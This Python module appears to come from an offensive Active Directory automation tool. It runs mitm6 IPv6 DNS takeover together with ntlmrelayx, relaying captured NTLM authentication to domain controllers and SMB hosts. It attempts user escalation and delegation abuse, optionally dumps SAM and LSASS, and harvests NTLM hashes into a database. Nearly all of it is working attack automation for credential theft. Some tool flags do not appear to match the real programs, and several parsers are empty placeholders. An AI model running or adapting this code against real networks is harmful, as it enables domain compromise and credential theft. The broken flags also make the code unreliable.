#!/usr/bin/env python3
"""
mitm6 and NTLM Relay Module for AD-Automaton
Handles IPv6 DNS takeover attacks combined with NTLM relay for privilege escalation.
"""

import os
import time
import logging
import subprocess
from typing import List, Dict, Any, Optional, Tuple
from pathlib import Path

import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'lib'))

from database import DatabaseManager, Credential, Host
from executor import CommandExecutor
from logger import log_discovery, log_tool_execution, log_tool_result

class Mitm6RelayAttacker:
    """
    Handles IPv6 DNS takeover attacks using mitm6 combined with NTLM relay attacks.
    This attack chain exploits IPv6 configuration weaknesses to capture and relay credentials.
    """
    
    def __init__(self, db_manager: DatabaseManager, config: Dict[str, Any]):
        """
        Initialize the mitm6 relay attacker.
        
        Args:
            db_manager: Database manager instance
            config: Configuration dictionary
        """
        self.db_manager = db_manager
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.executor = CommandExecutor()
        
        # Get tool configurations
        self.mitm6_config = config.get('tools', {}).get('mitm6', {})
        self.impacket_config = config.get('tools', {}).get('impacket', {})
        
        self.mitm6_path = self.mitm6_config.get('path', 'mitm6')
        self.ntlmrelayx_path = self.impacket_config.get('ntlmrelayx_path', 'impacket-ntlmrelayx')
        self.log_file = self.mitm6_config.get('log_file', '/tmp/mitm6.log')
        
        # Feature flag
        self.enabled = config.get('features', {}).get('enable_mitm6', True)
        
        # Runtime state
        self.mitm6_process = None
        self.ntlmrelayx_process = None
        self.attack_duration = 600  # Default 10 minutes
    
    def run_mitm6_ntlmrelay(self, interface: str, duration: int = 600) -> List[Credential]:
        """
        Main method to run mitm6 + NTLM relay attack.
        
        Args:
            interface: Network interface to use
            duration: Attack duration in seconds
            
        Returns:
            List of captured/relayed credentials
        """
        if not self.enabled:
            self.logger.info("mitm6 attacks are disabled in configuration")
            return []
        
        self.attack_duration = duration
        
        self.logger.info(f"Starting mitm6 + NTLM relay attack on interface {interface} for {duration} seconds")
        
        # OPSEC warning
        opsec_profile = self.config.get('opsec_profile', 'normal')
        if opsec_profile != 'noisy':
            self.logger.warning("mitm6 attacks are very noisy and will be detected by modern security tools!")
        
        captured_data = []
        
        try:
            # Get relay targets
            relay_targets = self._identify_relay_targets()
            
            if not relay_targets:
                self.logger.warning("No suitable relay targets found")
                return []
            
            # Start NTLM relay first
            self._start_ntlmrelay(relay_targets)
            
            # Start mitm6
            self._start_mitm6(interface)
            
            # Wait for the attack duration
            self.logger.info(f"Attack running... waiting {duration} seconds for results")
            time.sleep(duration)
            
            # Stop both processes
            self._stop_attacks()
            
            # Parse captured data
            captured_data = self._parse_attack_results()
            
            # Store results in database
            if captured_data:
                self._store_attack_results(captured_data)
            
        except KeyboardInterrupt:
            self.logger.info("mitm6 attack interrupted by user")
            self._stop_attacks()
        except Exception as e:
            self.logger.error(f"mitm6 attack failed: {e}")
            self._stop_attacks()
        
        log_discovery("credentials/data via mitm6 relay", len(captured_data))
        
        return captured_data
    
    def _identify_relay_targets(self) -> List[str]:
        """
        Identify suitable targets for NTLM relay attacks.
        
        Returns:
            List of target IP addresses
        """
        relay_targets = []
        
        # Get hosts from database
        hosts = self.db_manager.get_hosts()
        
        for host in hosts:
            # Look for hosts with SMB signing disabled or LDAP available
            services = self.db_manager.get_services_by_host(host.host_id)
            
            has_smb = any(s.port in [139, 445] for s in services)
            has_ldap = any(s.port in [389, 636] for s in services)
            
            # Prefer Domain Controllers for LDAP relay
            if host.is_dc and has_ldap:
                relay_targets.insert(0, host.ip_address)  # Add DC to front
                self.logger.info(f"Adding high-value LDAP relay target: {host.ip_address} (DC)")
            elif has_smb:
                relay_targets.append(host.ip_address)
                self.logger.debug(f"Adding SMB relay target: {host.ip_address}")
        
        # Limit to top 10 targets to avoid overwhelming the attack
        relay_targets = relay_targets[:10]
        
        self.logger.info(f"Identified {len(relay_targets)} relay targets")
        return relay_targets
    
    def _start_ntlmrelay(self, targets: List[str]) -> None:
        """
        Start ntlmrelayx.py process.
        
        Args:
            targets: List of target IP addresses
        """
        try:
            # Build ntlmrelayx command
            command = self._build_ntlmrelay_command(targets)
            
            log_tool_execution("ntlmrelayx", command)
            
            # Start ntlmrelayx as background process
            relay_log = f"/tmp/ntlmrelay_{int(time.time())}.log"
            self.ntlmrelayx_process = self.executor.execute_background(
                command,
                log_file=relay_log
            )
            
            if self.ntlmrelayx_process:
                self.logger.info(f"ntlmrelayx started with PID: {self.ntlmrelayx_process.pid}")
                
                # Give ntlmrelayx time to initialize
                time.sleep(3)
                
                # Check if process is still running
                if self.ntlmrelayx_process.poll() is not None:
                    raise Exception("ntlmrelayx process terminated unexpectedly")
            else:
                raise Exception("Failed to start ntlmrelayx process")
            
        except Exception as e:
            self.logger.error(f"Failed to start ntlmrelayx: {e}")
            raise
    
    def _start_mitm6(self, interface: str) -> None:
        """
        Start mitm6 process.
        
        Args:
            interface: Network interface to use
        """
        try:
            # Build mitm6 command
            command = self._build_mitm6_command(interface)
            
            log_tool_execution("mitm6", command)
            
            # Start mitm6 as background process
            self.mitm6_process = self.executor.execute_background(
                command,
                log_file=self.log_file
            )
            
            if self.mitm6_process:
                self.logger.info(f"mitm6 started with PID: {self.mitm6_process.pid}")
                
                # Give mitm6 time to initialize
                time.sleep(5)
                
                # Check if process is still running
                if self.mitm6_process.poll() is not None:
                    raise Exception("mitm6 process terminated unexpectedly")
            else:
                raise Exception("Failed to start mitm6 process")
            
        except Exception as e:
            self.logger.error(f"Failed to start mitm6: {e}")
            raise
    
    def _build_ntlmrelay_command(self, targets: List[str]) -> str:
        """
        Build ntlmrelayx command.
        
        Args:
            targets: List of target IP addresses
            
        Returns:
            Complete ntlmrelayx command
        """
        # Base command
        command = f"sudo {self.ntlmrelayx_path}"
        
        # Add targets
        if targets:
            target_list = ",".join(targets)
            command += f" -t ldaps://{targets[0]}"  # Primary target (preferably DC)
            
            # Add SMB targets if available
            smb_targets = targets[1:] if len(targets) > 1 else []
            if smb_targets:
                command += f" -tf /tmp/smb_targets.txt"
                
                # Create targets file
                try:
                    with open("/tmp/smb_targets.txt", "w") as f:
                        for target in smb_targets:
                            f.write(f"smb://{target}\n")
                except Exception as e:
                    self.logger.debug(f"Failed to create targets file: {e}")
        
        # Attack options
        command += " -6"  # Listen on IPv6
        command += " --no-smb-server"  # Don't start SMB server (mitm6 handles HTTP)
        command += " --no-wcf-server"  # Don't start WCF server
        command += " --no-raw-server"  # Don't start raw server
        
        # Enable specific attacks based on targets
        if any(self._is_domain_controller(target) for target in targets):
            # Domain Controller targets - try for domain admin
            command += " --escalate-user lowpriv"  # Escalate a low-privilege user
            command += " --delegate-access"  # Try to get delegation rights
        
        # Output options
        command += " -of /tmp/ntlmrelay_output"  # Output file base
        
        # OPSEC considerations
        opsec_profile = self.config.get('opsec_profile', 'normal')
        if opsec_profile == 'stealth':
            command += " --no-dump"  # Don't dump hashes
        elif opsec_profile == 'noisy':
            command += " --dump-sam"  # Dump SAM database
            command += " --dump-lsass"  # Dump LSASS
        
        return command
    
    def _build_mitm6_command(self, interface: str) -> str:
        """
        Build mitm6 command.
        
        Args:
            interface: Network interface to use
            
        Returns:
            Complete mitm6 command
        """
        # Base command
        command = f"sudo {self.mitm6_path} -i {interface}"
        
        # Get domain information
        domain = self._get_target_domain()
        if domain:
            command += f" -d {domain}"
        
        # Relay options
        command += " --relay-host 127.0.0.1"  # Relay to local ntlmrelayx
        command += " --relay-port 80"  # HTTP relay port
        
        # OPSEC considerations
        opsec_profile = self.config.get('opsec_profile', 'normal')
        if opsec_profile == 'stealth':
            command += " --no-ra"  # Don't send router advertisements
        elif opsec_profile == 'noisy':
            command += " --ra-interval 10"  # More frequent RAs
        
        # Verbose output
        command += " -v"
        
        return command
    
    def _get_target_domain(self) -> Optional[str]:
        """
        Get the target domain name from discovered information.
        
        Returns:
            Domain name or None
        """
        # Try to get domain from DC hostnames
        dcs = self.db_manager.get_dcs()
        
        for dc in dcs:
            if dc.hostname and '.' in dc.hostname:
                # Extract domain from FQDN
                parts = dc.hostname.split('.')
                if len(parts) >= 2:
                    domain = '.'.join(parts[1:])  # Remove hostname part
                    return domain
        
        # Fallback: try common domain patterns
        common_domains = ['domain.local', 'ad.local', 'corp.local']
        return common_domains[0]  # Return first as fallback
    
    def _is_domain_controller(self, ip_address: str) -> bool:
        """
        Check if an IP address belongs to a Domain Controller.
        
        Args:
            ip_address: IP address to check
            
        Returns:
            True if it's a DC
        """
        dcs = self.db_manager.get_dcs()
        return any(dc.ip_address == ip_address for dc in dcs)
    
    def _stop_attacks(self) -> None:
        """Stop both mitm6 and ntlmrelayx processes."""
        # Stop mitm6
        if self.mitm6_process:
            try:
                self.logger.info("Stopping mitm6...")
                success = self.executor.terminate_process(self.mitm6_process)
                if success:
                    self.logger.info("mitm6 stopped successfully")
                else:
                    self.logger.warning("Failed to stop mitm6 gracefully")
                self.mitm6_process = None
            except Exception as e:
                self.logger.error(f"Error stopping mitm6: {e}")
        
        # Stop ntlmrelayx
        if self.ntlmrelayx_process:
            try:
                self.logger.info("Stopping ntlmrelayx...")
                success = self.executor.terminate_process(self.ntlmrelayx_process)
                if success:
                    self.logger.info("ntlmrelayx stopped successfully")
                else:
                    self.logger.warning("Failed to stop ntlmrelayx gracefully")
                self.ntlmrelayx_process = None
            except Exception as e:
                self.logger.error(f"Error stopping ntlmrelayx: {e}")
    
    def _parse_attack_results(self) -> List[Credential]:
        """
        Parse results from both mitm6 and ntlmrelayx.
        
        Returns:
            List of captured credentials and data
        """
        results = []
        
        # Parse mitm6 log
        mitm6_results = self._parse_mitm6_log()
        results.extend(mitm6_results)
        
        # Parse ntlmrelayx output
        relay_results = self._parse_ntlmrelay_output()
        results.extend(relay_results)
        
        return results
    
    def _parse_mitm6_log(self) -> List[Credential]:
        """
        Parse mitm6 log file for captured information.
        
        Returns:
            List of credentials/information from mitm6
        """
        credentials = []
        
        try:
            if os.path.exists(self.log_file):
                with open(self.log_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                # Look for authentication attempts and redirections
                lines = content.split('\n')
                
                for line in lines:
                    # Parse successful authentications
                    if 'Authentication successful' in line:
                        # Extract user information if available
                        user_info = self._extract_user_from_mitm6_log(line)
                        if user_info:
                            credentials.append(user_info)
                    
                    # Log interesting events
                    if any(keyword in line.lower() for keyword in ['admin', 'domain', 'authenticated']):
                        self.logger.info(f"mitm6 event: {line.strip()}")
                
                self.logger.info(f"Parsed {len(credentials)} items from mitm6 log")
            
        except Exception as e:
            self.logger.error(f"Failed to parse mitm6 log: {e}")
        
        return credentials
    
    def _parse_ntlmrelay_output(self) -> List[Credential]:
        """
        Parse ntlmrelayx output files for relayed credentials.
        
        Returns:
            List of credentials from NTLM relay
        """
        credentials = []
        
        try:
            # Look for ntlmrelayx output files
            output_patterns = [
                '/tmp/ntlmrelay_output_*.txt',
                '/tmp/ntlmrelay_*.log'
            ]
            
            import glob
            
            for pattern in output_patterns:
                files = glob.glob(pattern)
                
                for file_path in files:
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        
                        # Parse different types of output
                        if 'SAM hashes' in content:
                            sam_creds = self._parse_sam_hashes(content)
                            credentials.extend(sam_creds)
                        
                        if 'NTDS.DIT' in content:
                            ntds_creds = self._parse_ntds_hashes(content)
                            credentials.extend(ntds_creds)
                        
                        # Look for successful relay events
                        relay_events = self._parse_relay_events(content)
                        credentials.extend(relay_events)
                        
                    except Exception as e:
                        self.logger.debug(f"Error parsing relay output file {file_path}: {e}")
            
            self.logger.info(f"Parsed {len(credentials)} credentials from NTLM relay output")
            
        except Exception as e:
            self.logger.error(f"Failed to parse NTLM relay output: {e}")
        
        return credentials
    
    def _extract_user_from_mitm6_log(self, log_line: str) -> Optional[Credential]:
        """Extract user information from mitm6 log line."""
        # This would need specific parsing based on mitm6 log format
        # For now, return a placeholder
        return None
    
    def _parse_sam_hashes(self, content: str) -> List[Credential]:
        """Parse SAM hashes from ntlmrelayx output."""
        credentials = []
        
        # SAM hash pattern: username:rid:lm_hash:nt_hash:::
        import re
        sam_pattern = r'(\w+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::'
        
        for match in re.finditer(sam_pattern, content):
            username, rid, lm_hash, nt_hash = match.groups()
            
            if username.lower() not in ['guest', 'defaultaccount']:
                credential = Credential(
                    username=username,
                    hash_value=f"{lm_hash}:{nt_hash}",
                    hash_type="NTLM",
                    source_tool="ntlmrelayx"
                )
                credentials.append(credential)
        
        return credentials
    
    def _parse_ntds_hashes(self, content: str) -> List[Credential]:
        """Parse NTDS hashes from ntlmrelayx output."""
        credentials = []
        
        # NTDS hash pattern
        import re
        ntds_pattern = r'([^:]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::'
        
        for match in re.finditer(ntds_pattern, content):
            full_username, rid, lm_hash, nt_hash = match.groups()
            
            # Extract domain and username
            domain = None
            username = full_username
            
            if '\\' in full_username:
                domain, username = full_username.split('\\', 1)
            
            credential = Credential(
                username=username,
                domain=domain,
                hash_value=f"{lm_hash}:{nt_hash}",
                hash_type="NTLM",
                source_tool="ntlmrelayx"
            )
            credentials.append(credential)
        
        return credentials
    
    def _parse_relay_events(self, content: str) -> List[Credential]:
        """Parse successful relay events."""
        # This would extract information about successful authentications
        # and privilege escalations from the relay output
        return []
    
    def _store_attack_results(self, results: List[Credential]) -> None:
        """
        Store attack results in the database.
        
        Args:
            results: List of credentials/data to store
        """
        stored_count = 0
        
        for result in results:
            if self.db_manager.add_credential(result):
                stored_count += 1
                self.logger.info(f"Stored mitm6 relay result: {result.username}")
        
        self.logger.info(f"Stored {stored_count} results from mitm6 relay attack")
    
    def check_ipv6_configuration(self, interface: str) -> Dict[str, Any]:
        """
        Check IPv6 configuration to assess mitm6 attack viability.
        
        Args:
            interface: Network interface to check
            
        Returns:
            IPv6 configuration assessment
        """
        self.logger.info(f"Checking IPv6 configuration on interface {interface}")
        
        assessment = {
            'ipv6_enabled': False,
            'has_ipv6_address': False,
            'router_advertisements': False,
            'dhcpv6_available': False,
            'attack_viability': 'Unknown'
        }
        
        try:
            # Check if IPv6 is enabled
            ipv6_check = f"ip -6 addr show {interface}"
            result = self.executor.execute(ipv6_check, timeout=10)
            
            if result.exit_code == 0 and 'inet6' in result.stdout:
                assessment['ipv6_enabled'] = True
                assessment['has_ipv6_address'] = True
            
            # Check for router advertisements
            ra_check = f"sudo rdisc6 {interface}"
            ra_result = self.executor.execute(ra_check, timeout=30)
            
            if ra_result.exit_code == 0:
                assessment['router_advertisements'] = True
            
            # Assess attack viability
            if assessment['ipv6_enabled']:
                if assessment['router_advertisements']:
                    assessment['attack_viability'] = 'High'
                else:
                    assessment['attack_viability'] = 'Medium'
            else:
                assessment['attack_viability'] = 'Low'
            
            self.logger.info(f"IPv6 attack viability: {assessment['attack_viability']}")
            
        except Exception as e:
            self.logger.error(f"IPv6 configuration check failed: {e}")
        
        return assessment

def run_mitm6_ntlmrelay(db_manager: DatabaseManager, config: Dict[str, Any], 
                       interface: str, duration: int = 600) -> List[Credential]:
    """
    Main entry point for mitm6 + NTLM relay attacks.
    
    Args:
        db_manager: Database manager instance
        config: Configuration dictionary
        interface: Network interface to use
        duration: Attack duration in seconds
        
    Returns:
        List of captured/relayed credentials
    """
    attacker = Mitm6RelayAttacker(db_manager, config)
    return attacker.run_mitm6_ntlmrelay(interface, duration)

def check_ipv6_attack_viability(db_manager: DatabaseManager, config: Dict[str, Any], 
                               interface: str) -> Dict[str, Any]:
    """
    Check if the network is vulnerable to IPv6 attacks.
    
    Args:
        db_manager: Database manager instance
        config: Configuration dictionary
        interface: Network interface to check
        
    Returns:
        IPv6 vulnerability assessment
    """
    attacker = Mitm6RelayAttacker(db_manager, config)
    return attacker.check_ipv6_configuration(interface) 